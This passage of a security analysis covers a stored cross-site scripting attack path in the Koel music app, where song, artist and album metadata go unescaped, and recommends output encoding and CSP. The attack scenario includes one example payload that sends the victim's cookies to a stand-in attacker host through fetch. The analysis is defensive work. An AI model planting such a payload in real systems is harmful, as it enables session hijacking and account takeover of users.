### 4. Deep Analysis of Attack Tree Path: Cross-Site Scripting (XSS) via Stored Data

#### 4.1. Vulnerability Description

**Stored Cross-Site Scripting (XSS)** occurs when an attacker injects malicious scripts into the application's database. This malicious code is then persistently stored and executed in the browsers of other users when they retrieve and view the affected data. Unlike reflected XSS, where the malicious script is part of the request, stored XSS poses a greater threat because the attack is persistent and can affect multiple users over time without direct interaction with the attacker.

In the context of Koel, the vulnerability lies in the potential for user-provided data, such as song titles, artist names, or album names, to be stored in the database without proper sanitization or encoding. When this data is later retrieved and displayed to other users, the injected malicious script is executed by their browsers.

#### 4.2. Attack Scenario Breakdown

1. **Attacker Action: Malicious Data Injection:**
   - An attacker, potentially with access to upload or modify music metadata (depending on Koel's configuration and access controls), crafts malicious data containing JavaScript code.
   - **Example:** Instead of a legitimate song title like "My Favorite Song", the attacker might inject: `<script>fetch('https://attacker.com/steal_cookie?cookie=' + document.cookie);</script> My Favorite Song`.
   - This malicious data is then submitted to the Koel application, likely through a form or API endpoint used for managing the music library.

2. **System Behavior: Data Storage without Sanitization:**
   - The Koel application, if vulnerable, stores this malicious data directly into its database without properly sanitizing or encoding it. This means the `<script>` tags and the JavaScript code within are stored verbatim.

3. **User Action: Accessing the Affected Data:**
   - A legitimate user browses the music library, searches for songs, views an artist's discography, or interacts with any part of the application that displays the attacker's injected data.

4. **Browser Behavior: Malicious Script Execution:**
   - When the Koel application retrieves the malicious data from the database and renders it in the user's browser, the browser interprets the `<script>` tags and executes the embedded JavaScript code.

5. **Impact:**
   - In the example above, the JavaScript code would attempt to send the user's cookies to the attacker's server (`attacker.com`). This could allow the attacker to hijack the user's session and perform actions on their behalf.

#### 4.3. Potential Entry Points in Koel

Based on the description, the primary entry points for this attack are the fields used to store music metadata:

* **Song Titles:**  The most obvious target, as users frequently interact with song titles.
* **Artist Names:**  Similar to song titles, these are displayed prominently.
* **Album Names:**  Another common field displayed to users.
* **Potentially other metadata:** Depending on Koel's features, fields like genre, composer, or even user-generated playlists names could be vulnerable if they allow arbitrary text input.

The specific forms or API endpoints used to upload or edit this metadata would be the technical entry points for the attacker.

#### 4.4. Potential Impact

A successful stored XSS attack via music metadata in Koel can have significant consequences:

* **Session Hijacking:**  As demonstrated in the example, attackers can steal user cookies, allowing them to impersonate legitimate users and gain unauthorized access to their accounts.
* **Account Takeover:** With access to a user's session, an attacker can change passwords, email addresses, or other account details, effectively taking over the account.
* **Data Theft:** Attackers could potentially access and exfiltrate other sensitive data within the application, depending on the user's privileges and the application's functionality.
* **Malware Distribution:** The injected script could redirect users to malicious websites or attempt to download malware onto their devices.
* **Defacement:** Attackers could alter the appearance of the application for other users, displaying unwanted messages or images.
* **Phishing:** The injected script could display fake login forms or other phishing attempts to steal user credentials.
* **Propagation of the Attack:**  If the injected script modifies other data within the application, it could further spread the XSS vulnerability.

#### 4.5. Likelihood and Severity

* **Likelihood:** The likelihood of this attack depends on whether Koel implements proper input sanitization and output encoding for user-provided metadata. If these security measures are absent or insufficient, the likelihood is **high**. The ease of injecting malicious data through standard music management interfaces also contributes to the likelihood.
* **Severity:** The severity of this attack is **critical**. The potential for session hijacking and account takeover can have severe consequences for individual users and the overall security of the application. The persistent nature of stored XSS amplifies the impact, as a single successful injection can affect numerous users over an extended period.

#### 4.6. Mitigation Strategies

To effectively mitigate the risk of stored XSS via music metadata in Koel, the development team should implement the following strategies:

* **Input Sanitization:**
    * **Strict Input Validation:** Implement robust validation on all user inputs, including metadata fields. Define allowed characters, lengths, and formats. Reject any input that does not conform to these rules.
    * **HTML Encoding/Escaping on Output:**  The most crucial defense. Before displaying any user-provided data in the HTML context, encode special characters (e.g., `<`, `>`, `"`, `'`, `&`) into their HTML entities (e.g., `&lt;`, `&gt;`, `&quot;`, `&#x27;`, `&amp;`). This prevents the browser from interpreting the data as HTML code. **This is the primary defense against stored XSS.**

* **Content Security Policy (CSP):**
    * Implement a strict CSP that restricts the sources from which the browser is allowed to load resources (scripts, stylesheets, etc.). This can help mitigate the impact of a successful XSS attack by preventing the execution of malicious scripts from unauthorized sources.

* **Regular Security Audits and Penetration Testing:**
    * Conduct regular security audits and penetration testing to identify and address potential vulnerabilities, including stored XSS.

* **Security Awareness Training:**
    * Educate developers about the risks of XSS and best practices for secure coding.

* **Framework-Level Protections:**
    * Utilize security features provided by the underlying web framework (if applicable) to help prevent XSS.

* **Consider using a templating engine with auto-escaping:** Many modern templating engines automatically escape output by default, reducing the risk of XSS.

* **Principle of Least Privilege:** Ensure that users and processes have only the necessary permissions to perform their tasks. This can limit the potential damage if an attacker gains access.

#### 4.7. Specific Considerations for Koel

* **Metadata Handling:**  Carefully review the code responsible for handling music metadata uploads and edits. Ensure that all metadata fields are properly sanitized and encoded before being stored in the database and displayed to users.
* **User Interface Components:** Examine the components used to display music information (e.g., song lists, artist pages, album views). Verify that these components correctly handle potentially malicious data.
* **API Endpoints:** If Koel exposes API endpoints for managing music metadata, ensure these endpoints also implement the necessary security measures.

### 5. Conclusion

The "Cross-Site Scripting (XSS) via stored data (e.g., song titles, artist names)" attack path represents a significant security risk for the Koel application. By injecting malicious scripts into music metadata, attackers can potentially compromise user accounts, steal sensitive information, and perform other malicious actions. Implementing robust input sanitization and output encoding, along with other security best practices like CSP, regular audits, and developer training, is crucial to effectively mitigate this vulnerability and protect Koel users. Prioritizing these mitigation strategies will significantly enhance the security posture of the application.
